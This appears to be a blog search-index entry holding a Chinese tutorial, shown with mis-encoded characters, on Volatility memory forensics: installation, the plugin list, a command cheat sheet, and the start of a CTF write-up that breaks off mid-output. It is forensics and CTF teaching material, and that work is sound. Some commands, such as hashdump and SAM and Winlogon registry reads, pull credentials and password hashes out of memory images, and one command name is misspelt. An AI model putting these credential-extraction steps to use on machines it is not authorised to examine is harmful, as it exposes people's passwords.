<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Volatilityå†…å­˜å–è¯</title>
    <link href="/2021/06/03/Volatility%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"/>
    <url>/2021/06/03/Volatility%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<h2 id="å®‰è£…Volatility"><a href="#å®‰è£…Volatility" class="headerlink" title="å®‰è£…Volatility"></a>å®‰è£…Volatility</h2><p>æ–°ç‰ˆkaliä¸è‡ªå¸¦Volatilityï¼Œéœ€è¦è‡ªå·±å®‰è£…æºç ç¼–è¯‘</p><p>1.ä¸‹è½½æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">https:<span class="hljs-comment">//pan.baidu.com/s/1r-9VC3aG-sP6wWziYNvXxA  </span><br><br>æå–ç ï¼š<span class="hljs-number">4</span>d4w<br></code></pre></td></tr></table></figure><p>2.å®‰è£…ä¾èµ–</p><ul><li>cryptoåº“å®‰è£…</li></ul><p>å®‰è£…pycryptodome</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">pip2 install pycryptodome -i https:<span class="hljs-comment">//pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="hljs-comment">#å¦‚æœä¸æŒ‡å®šå›½å†…æºï¼Œå¯èƒ½ä¼šå‡ºç°è¶…æ—¶é”™è¯¯HTTPSConnectionPool</span><br></code></pre></td></tr></table></figure><ul><li>distorm3åº“å®‰è£…</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">é¡¹ç›®åœ°å€<br>https:<span class="hljs-comment">//github.com/vext01/distorm3</span><br></code></pre></td></tr></table></figure><p>è§£å‹åˆ°kalié‡Œé¢ä¹‹åç”¨å‘½ä»¤ python setup.py install ç¼–è¯‘</p><p>è¾“å…¥pip2 listæŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Package      Version<br>------------ -------<br>cffi         1.14.0<br>distorm3     2<br>pip          20.3.4<br>pycryptodome 3.10.1<br>setuptools   18.5<br>volatility   2.6<br>wheel        0.29.0<br></code></pre></td></tr></table></figure><p>3.å®‰è£…Volatility<br>å°†å‰é¢ä¸‹è½½çš„é¡¹ç›®ï¼Œè§£å‹ä¹‹ååœ¨Volatilityä¸­æ‰“å¼€ç»ˆç«¯è¿›è¡Œç¼–è¯‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">python setup.py install <br></code></pre></td></tr></table></figure><p>æœ€åè¾“å…¥vol.py -hæµ‹è¯•ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali/volatility2.6]<br>â””â”€<span class="hljs-comment"># vol.py -h                                                            </span><br>Volatility Foundation Volatility Framework 2.6<br>Usage: Volatility - A memory forensics analysis platform.<br><br>Options:<br>  -h, --<span class="hljs-built_in">help</span>            list all available options and their default values.<br>                        Default values may be <span class="hljs-built_in">set</span> <span class="hljs-keyword">in</span> the configuration file<br>                        (/etc/volatilityrc)<br>  --conf-file=/root/.volatilityrc<br>                        User based configuration file<br>  -d, --debug           Debug volatility<br>  --plugins=PLUGINS     Additional plugin directories to use (colon separated)<br>  --info                Print information about all registered objects<br>  --cache-directory=/root/.cache/volatility<br>                        Directory <span class="hljs-built_in">where</span> cache files are stored<br>  --cache               Use caching<br>  --tz=TZ               Sets the (Olson) timezone <span class="hljs-keyword">for</span> displaying timestamps<br>                        using pytz (<span class="hljs-keyword">if</span> installed) or tzset<br>  -f FILENAME, --filename=FILENAME<br>                        Filename to use when opening an image<br>  --profile=WinXPSP2x86<br>                        Name of the profile to load (use --info to see a list<br>                        of supported profiles)<br>  -l LOCATION, --location=LOCATION<br>                        A URN location from <span class="hljs-built_in">which</span> to load an address space<br>  -w, --write           Enable write support<br>  --dtb=DTB             DTB Address<br>  --<span class="hljs-built_in">shift</span>=SHIFT         Mac KASLR <span class="hljs-built_in">shift</span> address<br>  --output=text         Output <span class="hljs-keyword">in</span> this format (support is module specific, see<br>                        the Module Output Options below)<br>  --output-file=OUTPUT_FILE<br>                        Write output <span class="hljs-keyword">in</span> this file<br>  -v, --verbose         Verbose information<br>  -g KDBG, --kdbg=KDBG  Specify a KDBG virtual address (Note: <span class="hljs-keyword">for</span> 64-bit<br>                        Windows 8 and above this is the address of<br>                        KdCopyDataBlock)<br>  --force               Force utilization of suspect profile<br>  --cookie=COOKIE       Specify the address of nt!ObHeaderCookie (valid <span class="hljs-keyword">for</span><br>                        Windows 10 only)<br>  -k KPCR, --kpcr=KPCR  Specify a specific KPCR address<br><br>        Supported Plugin Commands:<br><br>                amcache         Print AmCache information<br>                apihooks        Detect API hooks <span class="hljs-keyword">in</span> process and kernel memory<br>                atoms           Print session and window station atom tables<br>                atomscan        Pool scanner <span class="hljs-keyword">for</span> atom tables<br>                auditpol        Prints out the Audit Policies from HKLM\SECURITY\Policy\PolAdtEv<br>                bigpools        Dump the big page pools using BigPagePoolScanner<br>                bioskbd         Reads the keyboard buffer from Real Mode memory<br>                cachedump       Dumps cached domain hashes from memory<br>                callbacks       Print system-wide notification routines<br>                clipboard       Extract the contents of the windows clipboard<br>                cmdline         Display process command-line arguments<br>                cmdscan         Extract <span class="hljs-built_in">command</span> <span class="hljs-built_in">history</span> by scanning <span class="hljs-keyword">for</span> _COMMAND_HISTORY<br>                connections     Print list of open connections [Windows XP and 2003 Only]<br>                connscan        Pool scanner <span class="hljs-keyword">for</span> tcp connections<br>                consoles        Extract <span class="hljs-built_in">command</span> <span class="hljs-built_in">history</span> by scanning <span class="hljs-keyword">for</span> _CONSOLE_INFORMATION<br>                crashinfo       Dump crash-dump information<br>                deskscan        Poolscaner <span class="hljs-keyword">for</span> tagDESKTOP (desktops)<br>                devicetree      Show device tree<br>                dlldump         Dump DLLs from a process address space<br>                dlllist         Print list of loaded dlls <span class="hljs-keyword">for</span> each process<br>                driverirp       Driver IRP hook detection<br>                drivermodule    Associate driver objects to kernel modules<br>                driverscan      Pool scanner <span class="hljs-keyword">for</span> driver objects<br>                dumpcerts       Dump RSA private and public SSL keys<br>                dumpfiles       Extract memory mapped and cached files<br>                dumpregistry    Dumps registry files out to disk <br>                editbox         Displays information about Edit controls. (Listbox experimental.)<br>                envars          Display process environment variables<br>                eventhooks      Print details on windows event hooks<br>                evtlogs         Extract Windows Event Logs (XP/2003 only)<br>                filescan        Pool scanner <span class="hljs-keyword">for</span> file objects<br>                gahti           Dump the USER handle <span class="hljs-built_in">type</span> information<br>                gditimers       Print installed GDI timers and callbacks<br>                gdt             Display Global Descriptor Table<br>                getservicesids  Get the names of services <span class="hljs-keyword">in</span> the Registry and <span class="hljs-built_in">return</span> Calculated SID<br>                getsids         Print the SIDs owning each process<br>                handles         Print list of open handles <span class="hljs-keyword">for</span> each process<br>                hashdump        Dumps passwords hashes (LM/NTLM) from memory<br>                hibinfo         Dump hibernation file information<br>                hivedump        Prints out a hive<br>                hivelist        Print list of registry hives.<br>                hivescan        Pool scanner <span class="hljs-keyword">for</span> registry hives<br>                hpakextract     Extract physical memory from an HPAK file<br>                hpakinfo        Info on an HPAK file<br>                idt             Display Interrupt Descriptor Table<br>                iehistory       Reconstruct Internet Explorer cache / <span class="hljs-built_in">history</span><br>                imagecopy       Copies a physical address space out as a raw DD image<br>                imageinfo       Identify information <span class="hljs-keyword">for</span> the image <br>                impscan         Scan <span class="hljs-keyword">for</span> calls to imported <span class="hljs-built_in">functions</span><br>                joblinks        Print process job link information<br>                kdbgscan        Search <span class="hljs-keyword">for</span> and dump potential KDBG values<br>                kpcrscan        Search <span class="hljs-keyword">for</span> and dump potential KPCR values<br>                ldrmodules      Detect unlinked DLLs<br>                lsadump         Dump (decrypted) LSA secrets from the registry<br>                machoinfo       Dump Mach-O file format information<br>                malfind         Find hidden and injected code<br>                mbrparser       Scans <span class="hljs-keyword">for</span> and parses potential Master Boot Records (MBRs) <br>                memdump         Dump the addressable memory <span class="hljs-keyword">for</span> a process<br>                memmap          Print the memory map<br>                messagehooks    List desktop and thread window message hooks<br>                mftparser       Scans <span class="hljs-keyword">for</span> and parses potential MFT entries <br>                moddump         Dump a kernel driver to an executable file sample<br>                modscan         Pool scanner <span class="hljs-keyword">for</span> kernel modules<br>                modules         Print list of loaded modules<br>                multiscan       Scan <span class="hljs-keyword">for</span> various objects at once<br>                mutantscan      Pool scanner <span class="hljs-keyword">for</span> mutex objects<br>                notepad         List currently displayed notepad text<br>                objtypescan     Scan <span class="hljs-keyword">for</span> Windows object <span class="hljs-built_in">type</span> objects<br>                patcher         Patches memory based on page scans<br>                poolpeek        Configurable pool scanner plugin<br>                printkey        Print a registry key, and its subkeys and values<br>                privs           Display process privileges<br>                procdump        Dump a process to an executable file sample<br>                pslist          Print all running processes by following the EPROCESS lists <br>                psscan          Pool scanner <span class="hljs-keyword">for</span> process objects<br>                pstree          Print process list as a tree<br>                psxview         Find hidden processes with various process listings<br>                qemuinfo        Dump Qemu information<br>                raw2dmp         Converts a physical memory sample to a windbg crash dump<br>                screenshot      Save a pseudo-screenshot based on GDI windows<br>                servicediff     List Windows services (ala Plugx)<br>                sessions        List details on _MM_SESSION_SPACE (user logon sessions)<br>                shellbags       Prints ShellBags info<br>                shimcache       Parses the Application Compatibility Shim Cache registry key<br>                shutdowntime    Print ShutdownTime of machine from registry<br>                sockets         Print list of open sockets<br>                sockscan        Pool scanner <span class="hljs-keyword">for</span> tcp socket objects<br>                ssdt            Display SSDT entries<br>                strings         Match physical offsets to virtual addresses (may take a <span class="hljs-keyword">while</span>, VERY verbose)<br>                svcscan         Scan <span class="hljs-keyword">for</span> Windows services<br>                symlinkscan     Pool scanner <span class="hljs-keyword">for</span> symlink objects<br>                thrdscan        Pool scanner <span class="hljs-keyword">for</span> thread objects<br>                threads         Investigate _ETHREAD and _KTHREADs<br>                timeliner       Creates a timeline from various artifacts <span class="hljs-keyword">in</span> memory <br>                timers          Print kernel timers and associated module DPCs<br>                truecryptmaster Recover TrueCrypt 7.1a Master Keys<br>                truecryptpassphrase     TrueCrypt Cached Passphrase Finder<br>                truecryptsummary        TrueCrypt Summary<br>                unloadedmodules Print list of unloaded modules<br>                userassist      Print userassist registry keys and information<br>                userhandles     Dump the USER handle tables<br>                vaddump         Dumps out the vad sections to a file<br>                vadinfo         Dump the VAD info<br>                vadtree         Walk the VAD tree and display <span class="hljs-keyword">in</span> tree format<br>                vadwalk         Walk the VAD tree<br>                vboxinfo        Dump virtualbox information<br>                verinfo         Prints out the version information from PE images<br>                vmwareinfo      Dump VMware VMSS/VMSN information<br>                volshell        Shell <span class="hljs-keyword">in</span> the memory image<br>                windows         Print Desktop Windows (verbose details)<br>                wintree         Print Z-Order Desktop Windows Tree<br>                wndscan         Pool scanner <span class="hljs-keyword">for</span> window stations<br>                yarascan        Scan process or kernel memory with Yara signatures<br><br></code></pre></td></tr></table></figure><h2 id="å·¥å…·ä»‹ç»"><a href="#å·¥å…·ä»‹ç»" class="headerlink" title="å·¥å…·ä»‹ç»"></a>å·¥å…·ä»‹ç»</h2><h3 id="0x00-æŸ¥çœ‹é•œåƒç³»ç»Ÿ"><a href="#0x00-æŸ¥çœ‹é•œåƒç³»ç»Ÿ" class="headerlink" title="0x00 - æŸ¥çœ‹é•œåƒç³»ç»Ÿ"></a>0x00 - æŸ¥çœ‹é•œåƒç³»ç»Ÿ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;é•œåƒæ–‡ä»¶&gt; imageinfo  <span class="hljs-comment">#å¸¸è§çš„å†…å­˜é•œåƒæ–‡ä»¶æœ‰rawã€vmemã€dmpã€imgç­‰</span><br></code></pre></td></tr></table></figure><h3 id="0x01-æŸ¥çœ‹ç”¨æˆ·åå¯†ç ä¿¡æ¯"><a href="#0x01-æŸ¥çœ‹ç”¨æˆ·åå¯†ç ä¿¡æ¯" class="headerlink" title="0x01 - æŸ¥çœ‹ç”¨æˆ·åå¯†ç ä¿¡æ¯"></a>0x01 - æŸ¥çœ‹ç”¨æˆ·åå¯†ç ä¿¡æ¯</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;é•œåƒæ–‡ä»¶&gt; --profile=[profileæ–‡ä»¶] hashdump<br></code></pre></td></tr></table></figure><h3 id="0x02-æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯"><a href="#0x02-æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯" class="headerlink" title="0x02 - æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯"></a>0x02 - æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;é•œåƒæ–‡ä»¶&gt; --profile=[profileæ–‡ä»¶] pslist<br><br>vol.py -f &lt;é•œåƒæ–‡ä»¶&gt; --profile=[profileæ–‡ä»¶] pstree <span class="hljs-comment">#å¯ä»¥è¯†åˆ«å­è¿›ç¨‹å’Œçˆ¶è¿›ç¨‹ï¼Œä¸”å¯ä»¥æ˜¾ç¤ºå‡ºè¢«éšè—çš„ç—…æ¯’</span><br></code></pre></td></tr></table></figure><h3 id="0x03-æ‰«ææ‰€æœ‰çš„æ–‡ä»¶åˆ—è¡¨"><a href="#0x03-æ‰«ææ‰€æœ‰çš„æ–‡ä»¶åˆ—è¡¨" class="headerlink" title="0x03 - æ‰«ææ‰€æœ‰çš„æ–‡ä»¶åˆ—è¡¨"></a>0x03 - æ‰«ææ‰€æœ‰çš„æ–‡ä»¶åˆ—è¡¨</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;é•œåƒæ–‡ä»¶&gt; --profile=[profileæ–‡ä»¶] filescan<br><br>vol.py -f &lt;é•œåƒæ–‡ä»¶&gt; --profile=[profileæ–‡ä»¶] filescan | grep flag  <br></code></pre></td></tr></table></figure><h3 id="0x04-æŸ¥çœ‹cmdä¸Šçš„æ“ä½œ"><a href="#0x04-æŸ¥çœ‹cmdä¸Šçš„æ“ä½œ" class="headerlink" title="0x04 - æŸ¥çœ‹cmdä¸Šçš„æ“ä½œ"></a>0x04 - æŸ¥çœ‹cmdä¸Šçš„æ“ä½œ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;é•œåƒæ–‡ä»¶&gt; --profile=[profileæ–‡ä»¶] cmdscan<br><br>vol.py -f &lt;é•œåƒæ–‡ä»¶&gt; --profile=[profileæ–‡ä»¶] cmdline <span class="hljs-comment">#åˆ—å‡ºå‘½ä»¤è¡Œä¸‹è¿è¡Œçš„ç¨‹åº</span><br></code></pre></td></tr></table></figure><h3 id="0x05-æŸ¥çœ‹å…·ä½“æ¶æ„è¿›ç¨‹"><a href="#0x05-æŸ¥çœ‹å…·ä½“æ¶æ„è¿›ç¨‹" class="headerlink" title="0x05 - æŸ¥çœ‹å…·ä½“æ¶æ„è¿›ç¨‹"></a>0x05 - æŸ¥çœ‹å…·ä½“æ¶æ„è¿›ç¨‹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;é•œåƒæ–‡ä»¶&gt; --profile=[profileæ–‡ä»¶] pstree  | egrep <span class="hljs-string">&#x27;(a.exe|b.exe)&#x27;</span>   <span class="hljs-comment">#ä»¥æ ‘çš„å½¢å¼æ¥åˆ—å‡ºæ­£åœ¨è¿›è¡Œçš„è¿›ç¨‹</span><br></code></pre></td></tr></table></figure><h3 id="0x06-æ£€æŸ¥æ¶æ„é“¾æ¥"><a href="#0x06-æ£€æŸ¥æ¶æ„é“¾æ¥" class="headerlink" title="0x06 -  æ£€æŸ¥æ¶æ„é“¾æ¥"></a>0x06 -  æ£€æŸ¥æ¶æ„é“¾æ¥</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">æ£€æŸ¥é“¾æ¥æ’ä»¶ï¼švol.py -f &lt;é•œåƒæ–‡ä»¶&gt; --profile=[profileæ–‡ä»¶] connections<br>æ£€æŸ¥ç«¯å£æ’ä»¶ï¼švol.py -f &lt;é•œåƒæ–‡ä»¶&gt; --profile=[profileæ–‡ä»¶] sockets<br></code></pre></td></tr></table></figure><h3 id="0x07-æ£€æµ‹DLL"><a href="#0x07-æ£€æµ‹DLL" class="headerlink" title="0x07 - æ£€æµ‹DLL"></a>0x07 - æ£€æµ‹DLL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;é•œåƒæ–‡ä»¶&gt; --profile=[profileæ–‡ä»¶] dlllist -p[pid]<br>vol.py -f &lt;é•œåƒæ–‡ä»¶&gt; --profile=[profileæ–‡ä»¶] ldrmodules  -p[pid] -v <span class="hljs-comment">#æ˜¾ç¤ºåŒ…æ‹¬éšè—dllçš„å…·ä½“ä¿¡æ¯</span><br><br>vol.py -f &lt;é•œåƒæ–‡ä»¶&gt; --profile=[profileæ–‡ä»¶] malfind -p[pid] <span class="hljs-comment">#æ‰¾å‡ºæ³¨å…¥çš„å¯æ‰§è¡Œä»£ç æˆ–è€…DLL </span><br></code></pre></td></tr></table></figure><h3 id="0x08-æ ¹æ®PIDå¯¼å‡ºç¨‹åº"><a href="#0x08-æ ¹æ®PIDå¯¼å‡ºç¨‹åº" class="headerlink" title="0x08 - æ ¹æ®PIDå¯¼å‡ºç¨‹åº"></a>0x08 - æ ¹æ®PIDå¯¼å‡ºç¨‹åº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;é•œåƒæ–‡ä»¶&gt; --profile=[profileæ–‡ä»¶] prodump -p [PID] -D [ç›®å½•]<br></code></pre></td></tr></table></figure><h3 id="0x09-æ£€æŸ¥é©±åŠ¨ç¨‹åº"><a href="#0x09-æ£€æŸ¥é©±åŠ¨ç¨‹åº" class="headerlink" title="0x09 - æ£€æŸ¥é©±åŠ¨ç¨‹åº"></a>0x09 - æ£€æŸ¥é©±åŠ¨ç¨‹åº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;é•œåƒæ–‡ä»¶&gt; --profile=[profileæ–‡ä»¶] modules<br><br>vol.py -f &lt;é•œåƒæ–‡ä»¶&gt; --profile=[profileæ–‡ä»¶] moddump -D [ç›®å½•] --base [baseåœ°å€]  <span class="hljs-comment">#æå–é©±åŠ¨ç¨‹åº</span><br></code></pre></td></tr></table></figure><h3 id="0x10-æŸ¥çœ‹å¼€å¯çš„windowsæœåŠ¡"><a href="#0x10-æŸ¥çœ‹å¼€å¯çš„windowsæœåŠ¡" class="headerlink" title="0x10 - æŸ¥çœ‹å¼€å¯çš„windowsæœåŠ¡"></a>0x10 - æŸ¥çœ‹å¼€å¯çš„windowsæœåŠ¡</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;é•œåƒæ–‡ä»¶&gt; --profile=[profileæ–‡ä»¶] svcscan<br></code></pre></td></tr></table></figure><h3 id="0x10-æŸ¥çœ‹æ³¨å†Œè¡¨é¡¹"><a href="#0x10-æŸ¥çœ‹æ³¨å†Œè¡¨é¡¹" class="headerlink" title="0x10 - æŸ¥çœ‹æ³¨å†Œè¡¨é¡¹"></a>0x10 - æŸ¥çœ‹æ³¨å†Œè¡¨é¡¹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;é•œåƒæ–‡ä»¶&gt; --profile=[profileæ–‡ä»¶] printkey<br></code></pre></td></tr></table></figure><h3 id="0x11-åˆ—å‡ºSAMè¡¨ä¸­çš„ç”¨æˆ·"><a href="#0x11-åˆ—å‡ºSAMè¡¨ä¸­çš„ç”¨æˆ·" class="headerlink" title="0x11 - åˆ—å‡ºSAMè¡¨ä¸­çš„ç”¨æˆ·"></a>0x11 - åˆ—å‡ºSAMè¡¨ä¸­çš„ç”¨æˆ·</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;é•œåƒæ–‡ä»¶&gt; --profile=[profileæ–‡ä»¶] printkey -K <span class="hljs-string">&quot;SAM\Domains\Account\Users\Names&quot;</span><br></code></pre></td></tr></table></figure><h3 id="0x12-è·å–æœ€åç™»å½•ç³»ç»Ÿçš„ç”¨æˆ·"><a href="#0x12-è·å–æœ€åç™»å½•ç³»ç»Ÿçš„ç”¨æˆ·" class="headerlink" title="0x12 - è·å–æœ€åç™»å½•ç³»ç»Ÿçš„ç”¨æˆ·"></a>0x12 - è·å–æœ€åç™»å½•ç³»ç»Ÿçš„ç”¨æˆ·</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;é•œåƒæ–‡ä»¶&gt; --profile=[profileæ–‡ä»¶] printkey -K <span class="hljs-string">&quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span><br></code></pre></td></tr></table></figure><h3 id="0x13-æŸ¥çœ‹æ³¨å†Œè¡¨ä¿¡æ¯"><a href="#0x13-æŸ¥çœ‹æ³¨å†Œè¡¨ä¿¡æ¯" class="headerlink" title="0x13 - æŸ¥çœ‹æ³¨å†Œè¡¨ä¿¡æ¯"></a>0x13 - æŸ¥çœ‹æ³¨å†Œè¡¨ä¿¡æ¯</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;é•œåƒæ–‡ä»¶&gt; --profile=[profileæ–‡ä»¶] hivelist<br><br>vol.py -f &lt;é•œåƒæ–‡ä»¶&gt; --profile=[profileæ–‡ä»¶] hivedump -o 0x93fc41e8(æ³¨å†Œè¡¨çš„ virtual åœ°å€)  <span class="hljs-comment">#å¯¼å‡ºæ³¨å†Œè¡¨</span><br></code></pre></td></tr></table></figure><h3 id="0x14-è·å–æµè§ˆå™¨æµè§ˆå†å²"><a href="#0x14-è·å–æµè§ˆå™¨æµè§ˆå†å²" class="headerlink" title="0x14 - è·å–æµè§ˆå™¨æµè§ˆå†å²"></a>0x14 - è·å–æµè§ˆå™¨æµè§ˆå†å²</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;é•œåƒæ–‡ä»¶&gt; --profile=[profileæ–‡ä»¶] iehistory<br></code></pre></td></tr></table></figure><h3 id="0x15-æŸ¥çœ‹æ—¶é—´çº¿"><a href="#0x15-æŸ¥çœ‹æ—¶é—´çº¿" class="headerlink" title="0x15- æŸ¥çœ‹æ—¶é—´çº¿"></a>0x15- æŸ¥çœ‹æ—¶é—´çº¿</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;é•œåƒæ–‡ä»¶&gt; --profile=[profileæ–‡ä»¶] timeliner<br></code></pre></td></tr></table></figure><h2 id="CTFä¸­çš„å†…å­˜å–è¯é¢˜"><a href="#CTFä¸­çš„å†…å­˜å–è¯é¢˜" class="headerlink" title="CTFä¸­çš„å†…å­˜å–è¯é¢˜"></a>CTFä¸­çš„å†…å­˜å–è¯é¢˜</h2><h3 id="æ¹–æ¹˜æ¯2020-passwd"><a href="#æ¹–æ¹˜æ¯2020-passwd" class="headerlink" title="[æ¹–æ¹˜æ¯2020] passwd"></a>[æ¹–æ¹˜æ¯2020] passwd</h3><p>æŸ¥çœ‹å†…å­˜é•œåƒçš„åŸºæœ¬ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali/volatility2.6]<br>â””â”€<span class="hljs-comment"># vol.py -f WIN-BU6IJ7FI9RU-20190927-152050.raw imageinfo</span><br>Volatility Foundation Volatility Framework 2.6<br>INFO    : volatility.debug    : Determining profile based on KDBG search...<br>          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86<br>                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)                                                                         <br>                     AS Layer2 : FileAddressSpace 